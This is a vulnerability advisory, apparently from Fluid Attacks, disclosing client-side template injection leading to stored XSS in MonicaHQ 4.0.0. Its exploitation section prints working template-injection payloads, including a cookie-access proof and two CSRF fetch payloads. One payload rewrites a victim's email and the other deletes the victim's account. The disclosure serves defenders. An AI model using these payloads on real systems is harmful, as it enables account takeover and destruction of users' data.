---
slug: advisories/napoli/
title: MonicaHQ 4.0.4 - Client Side Template Injection
authors: Lautaro Casanova
writer: lcasanova
codename: napoli
product: MonicaHQ 4.0.0
date: 2023-04-17 12:00 COT
cveid: CVE-2023-1031,CVE-2023-1094,CVE-2023-30787,CVE-2023-30788,CVE-2023-30789,CVE-2023-30790
severity: 8.0
description: MonicaHQ 4.0.4   -    Client Side Template  (CSTI)
keywords: Fluid Attacks, Security, Vulnerabilities, Monicahq, CSTI
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                            |
| --------------------- | ---------------------------------------------------------- |
| **Name**              | MonicaHQ 4.0.4 - Client Side Template Injection            |
| **Code name**         | [napoli](https://es.wikipedia.org/wiki/Chizzo_N%C3%A1poli) |
| **Product**           | MonicaHQ                                                   |
| **Affected versions** | 4.0.0                                                      |
| **State**             | Public                                                     |
| **Release Date**      | 2023-04-17                                                 |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Client Side Template Injection                                                                         |
| **Rule**              | [010. Stored cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/010)   |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 8.0                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-1031](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1031), [CVE-2023-1094](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1094), [CVE-2023-30787](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30787), [CVE-2023-30788](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30788), [CVE-2023-30789](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30789), [CVE-2023-30790](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30790)                            |

## Description

MonicaHQ version 4.0.0 allows an authenticated remote attacker to execute
malicious code in the application. This is possible because the application
does not correctly validate the data entered by the user.

## Vulnerability

This vulnerability occurs because the application does not correctly validate
the data entered by users when creating new contacts within the application, as
well as the characteristics of the contacts themselves.

## Exploitation

First we create a contact:

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/create-contact.png)

After creating the contact you can edit its characteristics. At this point
there are many inputs which are vulnerable. The PoC of the exploitation of one
of them will be shown but it applies to all the others. In this case we edit
the food preference feature. We inject the following payload which interprets:

```js
{{7*7}}
```

At this point we can say that it is vulnerable to CSTI since we see the value
49 reflected.

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/test-csti.png)

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/out-csti.png)

Thanks to this it is possible to inject JavaScript code, which is interpreted.

```js
{{{}.toString.constructor('confirm(document.cookie)')()}}
```

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/out-xss.png)

![CSTI-Monica](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/xsrf.png)

As the XSS is stored, CSRF can be applied to change another user's email
address or delete their account.

## Evidence of exploitation

### CSTI to CSRF Change mail

```js
{{  fetch('http://localhost:8080/settings/save', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
        _token: document.querySelector('[name="_token"]').value,
        id: 3,
        first_name: 'test',
        last_name: 'testt',
        email: 'attacker@test.com',
        locale: 'es',
        currency_id: 4,
        temperature_scale: 'celsius',
        timezone: 'Europe/Madrid',
        reminder_time: '12:00',
        name_order: 'firstname_lastname_nickname',
        fluid_container: 1
        })
    })
    .then(res => res.text())
    .then(text => window.location.href = text)
}}
```

![RCE-FIleManager](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/Monica-CSRF-Contact(1).gif)

### CSTI to CSRF Delete Account

```js
{{
    fetch('http://localhost:8080/settings/delete', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: '_token=' + document.querySelector('[name="_token"]').value
    })
    .then(res => res.text())
    .then(text => window.location.href = text)
}}
```

![RCE-FileManager](https://raw.githubusercontent.com/BetaH4k/MonicaHQ/main/monica-delete-account.gif)

## Our security policy

We have reserved the CVE-2023-1031, CVE-2023-1094, CVE-2023-30787, CVE-2023-30788,
CVE-2023-30789, CVE-2023-30790 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: MonicaHQ 4.0.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Lautaro Casanova](https://www.linkedin.com/in/beta-casanova/)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://github.com/monicahq/monica>

**Release page** <https://github.com/monicahq/monica/releases/tag/v4.0.0>

## Timeline

<time-lapse
  discovered="2023-03-30"
  contacted="2023-03-30"
  replied=""
  confirmed="2023-04-17"
  patched=""
  disclosure="2023-04-17">
</time-lapse>
